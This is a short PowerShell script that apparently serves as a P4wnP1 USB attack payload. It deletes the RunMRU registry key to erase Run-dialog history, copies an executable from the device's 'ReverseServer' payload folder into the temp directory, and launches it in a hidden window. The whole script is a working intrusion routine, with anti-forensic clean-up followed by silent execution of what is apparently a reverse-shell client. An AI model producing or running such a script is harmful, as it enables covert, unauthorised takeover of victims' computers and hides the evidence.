clear
#Clear Run History
remove-item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
$Drive = (Get-WMIObject Win32_Volume | ? { $_.Label -eq 'p4wnp1' }).name
#Replace with "payloads\ReverseServer\client.exe" your file location
$sorcefile = $Drive + "payloads\ReverseServer\client.exe" 
$destination=$env:temp
$CheckFile = Test-Path ($env:temp+'\client.exe')
Copy-Item -Path $sorcefile -destination $destination
Start-Process -WindowStyle Hidden -FilePath ($destination+'\client.exe')
